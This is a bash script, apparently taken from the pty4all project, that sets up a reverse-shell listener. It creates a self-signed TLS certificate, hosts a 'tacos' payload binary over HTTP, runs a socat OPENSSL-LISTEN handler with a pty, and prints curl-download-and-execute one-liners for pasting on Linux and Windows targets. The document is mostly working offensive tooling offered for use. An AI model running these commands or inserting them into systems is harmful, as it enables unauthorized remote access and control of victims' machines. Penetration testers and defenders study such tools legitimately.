#!/bin/bash

# From https://github.com/laluka/pty4all

for i in "$@"; do
    case $i in
    --lport)
        LPORT="$2"
        shift;shift;
        ;;
    --lhost)
        LHOST="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;        
    --gitar)
        GITAR=true
        ;;
    --windows)
        WINDOWS=true
        ;;
    *)    
        ;;
    esac
done

#default value & envar

SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")

echo "$BASEDIR baseeee"

if [[ -z "$WEBPORT" ]];
then
    WEBPORT=8080
fi

if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]];
then
    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEB_PORT>"
    echo "to preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT> --gitar"
    exit 92
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

if [[ "$WINDOWS" ]]; then
    BINARY="tacos.exe"
    SCRIPT=$BASEDIR"/socat-forker-windows.sh"
else
    BINARY="tacos"
    SCRIPT=$BASEDIR"/socat-forker.sh"
fi

echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp ${SCRIPT}.tpl ${SCRIPT}

if [[ "$GITAR" ]]; then
    echo "[+] gitar shortcuts enabled on reverse shell"
    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
    echo "[+] launch gitar server"
    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret tacos"
else
    echo "[+] gitar shortcuts  not enabled"
    tmux split-window -h "python3 -m http.server ${WEBPORT}"
fi

# put tacos in current directory
PWD=$(pwd)
if [[ -f "./$BINARY" ]];then
    echo "[*] ${BINARY} is already in ${PWD}"
else
    RED='\033[1;31m'
    NC='\033[0m' # No Color
    printf "${RED}[*] Put ${BINARY} in ${PWD} before launching reverse shell process${NC}\n"

fi

echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
if [[ "$GITAR" ]]; then
	echo "(🐧) curl -O ${LHOST}:${WEBPORT}/tacos/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
else
    echo
    echo "(🪟) curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
    echo "(🐧) curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
fi

# echo "[*] Enjoy meal!"

if [[ "$WINDOWS" ]]; then
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./${SCRIPT},pty
else
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./${SCRIPT},pty,raw,echo=0
fi
